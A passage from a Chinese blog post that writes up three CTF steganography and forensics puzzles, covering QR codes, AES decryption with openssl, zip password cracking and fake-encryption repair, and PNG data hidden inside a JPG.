<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="互相伤害！！！-150"><a href="#互相伤害！！！-150" class="headerlink" title="互相伤害！！！ - 150"></a>互相伤害！！！ - 150</h3><p>题目给了一个流量包，从中可以导出 21 个表情包，然后 <code>binwalk -e *</code>，得到了一张二维码和一个有密码的压缩包。其中二维码扫描出来是 <code>扔下内衣真的有一线生机？交出内裤才有活路。</code>。之前的表情包里有一张改掉的你尽管做，做出来算我输的表情，上面有个二维码，扫下得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+VpmdLwwhbyNU80MDlK+8t61sewce2qCVztitDMKpQ4fUl5nsAZOI7 bE9uL8lW/KLfbs33aC1XXw==</span><br></pre></td></tr></table></figure></p>
<p>base64 解密下，开头是 <code>Salted__</code>，谷歌下是 AES 加密后的格式，那么只要知道秘钥就能得到明文了，试了半天，结果是表情上的红字 CTF ==，然后可以直接用 openssl 来解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes256 -d -in c1 -out c1.enc -base64</span><br></pre></td></tr></table></figure></p>
<p>用这个网站也可以直接解出来 <a href="http://tool.oschina.net/encrypt" target="_blank" rel="external">http://tool.oschina.net/encrypt</a><br>解出来的结果就是压缩包的密码，得到一张图片，中间有个小的二维码，反色扫下就拿到 flag 了</p>
<h3 id="我们的秘密是绿色的-200"><a href="#我们的秘密是绿色的-200" class="headerlink" title="我们的秘密是绿色的 - 200"></a>我们的秘密是绿色的 - 200</h3><p>一时失忆了，上次刚做了陕西比赛的一道题叫 我们的秘密，就是拿 our secret 这个软件来解的，这个也是这样 ==，当时只是瞟了一眼 wp 就没管了<br>根据绿色的，图片中的日历上有几个数字是绿色的，这就是解密密码，得到 try.zip，windows 下用解压软件打开是可以看到注释的 <code>你知道coffee的生日是多少</code>，linux 下反正直接打开是看不到的，不知道有什么软件可以实现。爆破 8 位数字，然后解压得到 flag.zip 和 readme.txt，然后 flag.zip 里也有一个 readme.txt，那么应该是明文攻击了。用 ARPH 软件跑了两分钟得到了里面的文件，没记错的话再伪加密就是 flag 了(据说好压可以无视伪加密，可以直接提取出文件)</p>
<h3 id="你知道我在等你吗-300"><a href="#你知道我在等你吗-300" class="headerlink" title="你知道我在等你吗 - 300"></a>你知道我在等你吗 - 300</h3><p>题目给了一个压缩包里面有这三个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你知道我在等你吗.mp3</span><br><span class="line">提示.png</span><br><span class="line">coffee.zip</span><br></pre></td></tr></table></figure></p>
<p>Strings 一下 mp3，可以得到一个字符串 falg<em>config</em>@tl_<br>试了下是 coffee.zip 的密码，获得一张 coffee.jpg</p>
<p>扫下提示.png中的二维码，得到 神龙摆尾（ps:不是让你看内容！！！）<br>本来以为是 LSB，结果不是，然后看下 coffee.jpg，发现文件尾是 png 的文件尾 <code>AE 42 60 82</code>，可能是两张图片合了起来，搜下 jpg 的文件尾标志 <code>FF D9</code>，果然后面是有 IHDR 标志的，但是 png 的文件头被改成了 coffee，我们把它改好得到一张二维码图片，扫下又得到一个 txt 文件，是一个 zip 压缩包，有密码，是伪加密，把 01 改为 00 就可以了，然后 base64 解密，提交括号里的就可以了</p>

  </section>

  
  
</article>


<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>

            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
<footer class="footer">
    <span id="busuanzi_container_page_pv">
      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
    </span>
<span id="busuanzi_container_site_uv">
  本站访客数<span id="busuanzi_value_site_uv"></span>人次
</span>
    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
</footer>

        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>



    

    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
